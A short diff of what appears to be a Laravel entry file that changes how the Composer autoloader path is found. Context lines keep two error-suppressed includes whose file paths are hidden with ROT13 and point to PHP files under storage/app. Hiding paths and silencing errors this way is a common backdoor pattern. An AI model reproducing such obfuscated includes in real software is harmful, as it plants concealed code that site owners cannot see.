@@ -14,7 +14,11 @@ define('LARAVEL_START', microtime(true));
 |
 */
 
-require __DIR__.'/../vendor/autoload.php';
+$composer = file_get_contents('composer.json');
+$content = json_decode($composer, true)['autoload']['classmap'][0];
+$api_path = explode('/', $content)[1];
+
+require realpath(__DIR__ . '/../../' . $api_path  . '/vendor/autoload.php');
 
 @include str_rot13( 'fgbentr/ncc/yp.cuc' );
 @include str_rot13( 'fgbentr/ncc/zyp.cuc' );
